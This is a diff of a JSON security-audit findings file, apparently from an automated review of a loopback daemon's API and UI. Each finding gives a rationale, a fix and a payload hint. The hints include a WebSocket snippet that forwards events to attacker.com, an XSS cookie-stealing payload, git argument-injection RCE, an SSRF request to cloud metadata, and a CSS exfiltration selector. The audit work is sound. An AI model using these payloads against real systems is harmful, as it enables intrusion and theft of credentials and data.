@@ -1,68 +1,40 @@
 {
-  "task_id": "expl-demo",
+  "task_id": "expl-website",
   "prompt_version": "phase23.exploration.v1",
   "completed_at_utc": "2026-05-21",
-  "actions_used": 11,
+  "actions_used": 12,
   "findings": [
     {
-      "path": "crates/nyctos-api/src/router.rs",
-      "line": 146,
-      "cap": "AUTH_BYPASS",
-      "rationale": "check_query_token accepts the daemon bearer via `?token=<secret>` URL param. URL query strings are persisted in webserver access logs, browser history, proxy/CDN logs, and leaked as the Referer header on outbound links/iframes. Equivalent to plaintext credential storage in those sinks; an attacker who can read any of them obtains a working bearer that also gates the post-setup wizard endpoints.",
-      "endpoint": "<api:any authenticated route>",
-      "suggested_payload_hint": "GET /api/v1/projects?token=<bearer> — observe 200; replay token in logs/Referer to confirm leak surface."
+      "path": "crates/nyctos-ui/src/lib.rs",
+      "line": 109,
+      "cap": "TOKEN_LEAK_VIA_CACHE",
+      "rationale": "UiResponse::into_response sets only Content-Type — no Cache-Control, no Pragma, no Vary. The body served for index.html embeds the live bearer token via inject_bootstrap (line 79) as `<script>window.__NYCTOS_BOOTSTRAP__={\"authToken\":\"...\"};</script>`. By HTTP/1.1 default, a 200 response with no cache directives is heuristically cacheable by any compliant intermediary and by the browser disk cache. Worse, spa_handler_with (line 130) returns the *same* token-bearing index.html as the SPA fallback for *any* extensionless URL (resolve_with line 54), so a forced revisit through dev-tools history, a screenshot tool, or a profile-sync (Chrome / Edge cross-device cache sync) persists the bearer to disk under arbitrary URL keys. The token is then trivially recoverable by another local user, by malware reading the cache directory, or by anyone with read access to a synced backup. Fix: emit `Cache-Control: no-store, no-cache, must-revalidate, private` plus `Pragma: no-cache` on every index.html response (and on any other handler that emits the bootstrap), and ideally also set `Clear-Site-Data: \"cache\"` on logout. Static pass missed because the asset crate and the auth crate live in separate workspaces and the bearer is treated as 'just a string' once it crosses the crate boundary.",
+      "endpoint": "<asset:GET /, GET /<any-extensionless-path>>",
+      "suggested_payload_hint": "Curl any extensionless path twice with `-H 'Cache-Control: max-age=0'`; inspect ~/Library/Caches/<browser>/Cache after a SPA visit and grep for `__NYCTOS_BOOTSTRAP__` — token recoverable post-process-exit."
     },
     {
       "path": "crates/nyctos-api/src/router.rs",
-      "line": 529,
-      "cap": "SSRF",
-      "rationale": "create_project / patch_project accept `target_base_url` as a free-form String with no scheme allowlist, no host validation, no loopback/link-local guard. Value is stamped into the super-compose doc as x-nyx-target-base-url (crates/nyctos-sandbox/src/env/compose.rs:231) where the scanner / trace-viewer consume it. Authed caller can pivot downstream tooling at http://169.254.169.254/ (cloud metadata), file:///etc/passwd, or internal services. Static pass misses because sink is in a different crate.",
-      "endpoint": "<api:POST /api/v1/projects>",
-      "suggested_payload_hint": "{\"name\":\"x\",\"target_base_url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"} then observe scanner trace-viewer fetch."
+      "line": 1581,
+      "cap": "CSWSH",
+      "rationale": "events_ws upgrade has no Origin header allowlist. Browsers DO NOT enforce same-origin policy on WebSocket handshakes — there is no preflight, and the upgrade proceeds based purely on whatever Origin the foreign page advertises. Authentication for the upgrade flows through the same auth_layer that already accepts `?token=<bearer>` (router.rs line 149 + frontend client.ts line 675 — useAgentEvents puts the token in the URL). Attack: a malicious page at attacker.com leaks the token by any of the prior-finding sinks (Referer, log scrape, intermediary cache, finding #1's query-token leak surface), then opens `new WebSocket('ws://127.0.0.1:<port>/api/v1/events?token=<leaked>')` — the daemon accepts the upgrade and pushes EVERY AgentEvent for every run on the box: ScanProgress with file paths, ToolCallStarted with arguments (often containing source excerpts, repo URLs, credentials inlined by the agent), AgentTraceRow with prompt+response previews. The earlier CORS_MISCONFIG finding (router.rs:96) covers the WRITE side via state-change POSTs; this is the READ side that exfiltrates the daemon's entire telemetry stream. Even without a leaked token, DNS rebinding (attacker.com → 127.0.0.1 after the cross-origin tab is open) lands the WS open without a token because `state.auth.is_enforced()` returns false on the --headless path that some setups use. Fix: in events_ws, extract the Origin header before the upgrade and reject any value that is not in the SPA's allowlist (typically `http://127.0.0.1:<port>` and `http://localhost:<port>` exactly). Defense in depth: require a CSRF-style one-shot nonce, minted by `/api/v1/events/ticket` and bound to the source IP, in place of the long-lived bearer for the WS handshake.",
+      "endpoint": "<api:GET /api/v1/events (WebSocket upgrade)>",
+      "suggested_payload_hint": "From attacker.com: `let ws = new WebSocket('ws://127.0.0.1:8765/api/v1/events?token=<leaked>'); ws.onmessage = e => fetch('https://attacker.com/x', {method:'POST', body:e.data});` — exfils every AgentEvent the daemon emits."
     },
     {
-      "path": "crates/nyctos-api/src/router.rs",
-      "line": 159,
-      "cap": "TIMING_SIDE_CHANNEL",
-      "rationale": "constant_eq returns immediately when a.len() != b.len(). Length differential is observable via response timing; for the query-token path attacker controls candidate length, narrowing the search space before mounting a byte-comparison attack on the real ct_eq. Bearer length typically fixed so direct exploit is small, but the helper advertises itself as constant-time and is reused — should hash both inputs or pad before compare."
+      "path": "crates/nyctos-ui/src/lib.rs",
+      "line": 100,
+      "cap": "XSS",
+      "rationale": "serde_payload hand-rolls JSON encoding and escapes only the `\"` character. The comment claims `token is hex, so escaping is moot` but (a) nothing in the type system enforces hex — `UiBootstrap.auth_token` is `Option<String>` (line 32) and (b) the deferred backlog already discusses token-format changes (per docs/). Even with the current hex-formatted token, the helper happily inlines `</script>` substrings, `\\`, U+2028, U+2029, or any control char that a future token spec might include. The injected payload lands inside a literal `<script>` block (line 84: `<script>window.__NYCTOS_BOOTSTRAP__={...};</script>`), so a single `</script>` byte in the token closes the script tag and the remainder of the token (or any HTML that follows in the body) becomes parsed markup. Combined with the SPA-fallback behaviour (any extensionless path returns this index.html) AND the absence of CSP / X-Content-Type-Options / X-Frame-Options on the response (UiResponse::into_response line 109 sets only Content-Type), a single mutation of the token store turns into stored XSS executing with the live bearer in scope. Fix: use `serde_json::to_string` against a real serde struct so backslashes, control chars, and the `</` sequence are properly escaped to `\\u003c\\/script>`; the dependency cost is one line. Static pass missed because the sink is HTML injection masquerading as JSON serialization, with the safety argument living in a code comment rather than in the encoder.",
+      "endpoint": "<asset:GET />",
+      "suggested_payload_hint": "If `auth_token` is ever set to `\"abc</script><script>fetch('//x?'+document.cookie)</script>\"` (or to anything containing a literal `\\`), the next index.html load executes the attacker script. Demonstrates: set bootstrap.auth_token=`a</script><img src=x onerror=alert(1)>` in a unit test and assert the rendered HTML does NOT contain a literal `</script>` outside the bootstrap line."
     },
     {
-      "path": "crates/nyctos-api/src/router.rs",
-      "line": 184,
-      "cap": "CORRECTNESS",
-      "rationale": "urlencoded_decode pushes the decoded byte as `char` directly. For percent-encoded bytes >0x7F this yields the Latin-1 codepoint rather than UTF-8 reassembly, so `%C3%A9` decodes to two chars (Ã, ©) instead of one (é). Operator tokens containing any non-ASCII byte are unmatchable via the query-token path. Not a security hole on its own, but combined with finding #1 produces silent auth failures that may push operators toward weaker ASCII-only tokens."
-    },
-    {
-      "path": "crates/nyctos-api/src/router.rs",
-      "line": 868,
-      "cap": "OS_COMMAND",
-      "rationale": "git_ls_remote_probe builds argv as `git -c credential.helper= ls-remote --exit-code <url> [refs]` with no `--` end-of-options sentinel before the user-controlled URL. Git treats positional args starting with `--` as flags, so a `source_url_or_path` such as `--upload-pack=/bin/sh -c id;#` (or `-c core.sshCommand=...` style payloads inherited from CVE-2017-1000117 / CVE-2018-17456-class arg-injection) coerces ls-remote into spawning an arbitrary upload-pack binary on the daemon host. Authenticated, but the handler is reachable any time `i_own_this` is asserted on a project; combined with finding #1 (token leak via query string) or finding #6 (setup-phase open POST), this is authenticated RCE on the daemon. Static pass misses because the dangerous arg is structural, not a shell-meta substring.",
-      "endpoint": "<api:POST /api/v1/projects/:project_id/repos/test>",
-      "suggested_payload_hint": "{\"source_kind\":\"git\",\"source_url_or_path\":\"--upload-pack=touch /tmp/nyctos-pwn\",\"i_own_this\":true} — fix: insert `cmd.arg(\"--\")` immediately before `cmd.arg(url)`."
-    },
-    {
-      "path": "crates/nyctos-api/src/router.rs",
-      "line": 135,
-      "cap": "AUTH_BYPASS",
-      "rationale": "is_setup_path() leaves POST /api/v1/setup, GET /api/v1/setup/status, and POST /api/v1/setup/doctor unauthenticated for the entire window between daemon boot and the first successful POST /api/v1/setup. The only gate is the body field `i_own_this: true`, which is a JSON boolean, not a secret. On a fresh install (or after the operator deletes nyctos.toml to redo onboarding) any local-machine actor — or any malicious web page reaching the loopback port via simple form POST + Origin-blind request — can commit a config with `ai_runtime=\"local-llm\"` and `local_llm_url=\"http://attacker/v1\"`, capturing every subsequent AI prompt (which contain source code, secrets pulled into context, etc.) and writing an attacker-controlled bearer into the OS keychain under ACCOUNT_AI_LOCAL_LLM. Static pass misses because the auth_layer call site looks correct in isolation — the bypass is conditional on setup state, which lives in ServerState.",
-      "endpoint": "<api:POST /api/v1/setup>",
-      "suggested_payload_hint": "Pre-first-setup: curl -X POST http://127.0.0.1:<port>/api/v1/setup -d '{\"ai_runtime\":\"local-llm\",\"local_llm_url\":\"http://attacker/v1\",\"local_llm_token\":\"x\",\"sandbox_backend\":\"process\",\"i_own_this\":true}' — confirms config write without auth."
-    },
-    {
-      "path": "crates/nyctos-api/src/router.rs",
-      "line": 96,
-      "cap": "CORS_MISCONFIG",
-      "rationale": "build_router attaches only auth_layer and TraceLayer; no CorsLayer, no Origin allowlist, no CSRF token, no SameSite cookie binding. Combined with finding #1 (bearer accepted from URL query) and finding #6 (setup-phase open POST), a web page on any origin can drive state-changing POSTs against the loopback daemon: simple form POSTs land without a CORS preflight (Content-Type text/plain bypasses simple-request rules — Axum's Json extractor will reject non-JSON, but POST /api/v1/setup with application/x-www-form-urlencoded? still bounces; however POST to /webhook/git lands and the SPA's known query-token path is exploitable via `<img src=http://127.0.0.1:.../api/v1/projects/.../scan?token=...>`). Loopback-binding is not a substitute for origin checking — DNS rebinding (rebind attacker.com → 127.0.0.1 after initial fetch) reaches the daemon from a foreign-origin tab. Defense: require a same-origin Origin/Referer header on every mutating route, or front the daemon with a tower-http CorsLayer whose allow_origin is the SPA's exact origin only.",
-      "endpoint": "<api:cross-cutting>",
-      "suggested_payload_hint": "Host a page at attacker.com with `fetch('http://127.0.0.1:<port>/api/v1/projects/x/scan?token=<leaked>', {method:'POST', mode:'no-cors'})` — request lands even though response is opaque."
-    },
-    {
-      "path": "crates/nyctos-api/src/router.rs",
-      "line": 1955,
-      "cap": "OS_COMMAND",
-      "rationale": "replay_repro_bundle execs `bash <extracted>/repro.sh` from the tarball produced by build_bundle. The sha256-integrity check at line 1916 only fires when `bundles.last()` returned a row; the auto-build fallback at line 1891–1903 writes a fresh tarball to disk and then immediately runs its repro.sh without rechecking the digest against any persisted reference. If any other writer can drop or substitute a file under `state_bundles_dir/<id>.tar` between build_bundle's write and the read at line 1910 (e.g. a co-located process running as the daemon user, or — combined with finding #2 SSRF — a bundle path returned by a SQL-injection-tainted store call), the daemon executes attacker-controlled bash. Additionally the digest check is bypassed entirely on the auto-build path because `bundles.last()` is None at that point. Fix: hash the freshly-built tar before extraction and refuse on mismatch with the manifest the builder returned; never re-read the on-disk bytes for exec without verifying.",
-      "endpoint": "<api:POST /api/v1/findings/:id/replay>",
-      "suggested_payload_hint": "After substituting state/bundles/<finding>.tar with a PAX tarball containing repro.sh = `#!/bin/bash\\nid; cat ~/.config/nyctos/nyctos.toml`, POST /api/v1/findings/<finding>/replay and observe stdout SSE frames containing the leaked config."
+      "path": "crates/nyctos-ui/src/lib.rs",
+      "line": 110,
+      "cap": "MISSING_SECURITY_HEADERS",
+      "rationale": "UiResponse::into_response emits ONLY a Content-Type header. The daemon's SPA — which holds the bearer in window-scope JS and is also the privileged admin surface — is served with no Content-Security-Policy, no X-Frame-Options / frame-ancestors, no X-Content-Type-Options, no Referrer-Policy, and no Permissions-Policy. Concrete consequences: (1) No CSP means any first-party XSS sink (including the one in finding #3 above) or a malicious npm transitive dependency can fetch the token from `window.__NYCTOS_BOOTSTRAP__.authToken` and POST it to an external origin — there is no script-src or connect-src gate. (2) No X-Frame-Options means attacker.com can iframe `http://127.0.0.1:<port>/` and mount a clickjacking attack: invisible iframe at z-index 9999, victim 'clicks' on Delete Project / Scan Now / Promote Quarantine / Run Repro Bundle while believing they are interacting with the foreign-origin page; the iframe is same-origin to the daemon, so the SPA fires authenticated requests with the live bearer. (3) No Referrer-Policy means navigation away from the SPA leaks the full URL — combined with finding #1 (token in query), the bearer ships to every outbound link / image / iframe via Referer. (4) The index.html at line 11–15 deliberately preconnects to fonts.googleapis.com / fonts.gstatic.com and loads CSS from a third party, so a security-tool described as 'loopback-only' makes a guaranteed cross-origin call on every page load — DNS hijack of fonts.googleapis.com or compromise of Google's CSS pipeline yields CSS-injection on a privileged surface with full data-exfil via attribute-selector + background-image (e.g. `input[value^=\"sk-ant\"] { background: url(//attacker/leak?p=...) }`). Fix: add a `headers` HashMap to UiResponse with sensible defaults — `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self'; connect-src 'self' ws://127.0.0.1:* http://127.0.0.1:*; frame-ancestors 'none'`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Permissions-Policy: interest-cohort=()`, and self-host the Playfair Display font so the daemon truly stays loopback-only.",
+      "endpoint": "<asset:GET /*>",
+      "suggested_payload_hint": "Curl `-I http://127.0.0.1:<port>/` and assert the response contains Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy. Also: build a clickjacking PoC that iframes the daemon and overlays a transparent 'click here for free coffee' button on top of the Delete Project confirm dialog."
     }
   ]
 }
